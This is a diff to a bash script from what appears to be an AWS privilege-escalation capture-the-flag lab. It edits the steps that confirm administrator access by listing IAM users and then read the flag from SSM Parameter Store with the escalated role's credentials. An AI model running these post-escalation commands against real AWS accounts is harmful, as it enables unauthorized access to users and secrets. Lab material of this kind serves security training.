@@ -177,17 +177,12 @@ echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
 sleep 15
 echo ""
 
-# [OBSERVATION] Step 6: Verify admin access
-use_readonly_creds
+# [EXPLOIT] Step 6: Verify admin access with the escalated role session
 echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
 echo "Testing admin permissions (listing IAM users)..."
-show_cmd "ReadOnly" "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
+show_cmd "Attacker" "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
 IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
 echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
-
-echo "Testing S3 access..."
-show_cmd "ReadOnly" "aws s3 ls"
-aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 
@@ -195,13 +190,7 @@ echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 rm -f /tmp/admin-policy-version.json
 
 # [EXPLOIT] Step 7: Capture the CTF flag
-# The starting role session now holds a policy version granting Action:* on Resource:*,
-# which provides ssm:GetParameter implicitly. Use those credentials to read the flag.
 echo -e "${YELLOW}Step 7: Capturing CTF flag from SSM Parameter Store${NC}"
-# Re-export role session credentials (set in Step 3, before use_readonly_creds was called in Step 6)
-export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
 FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-001-to-admin"
 show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
 FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
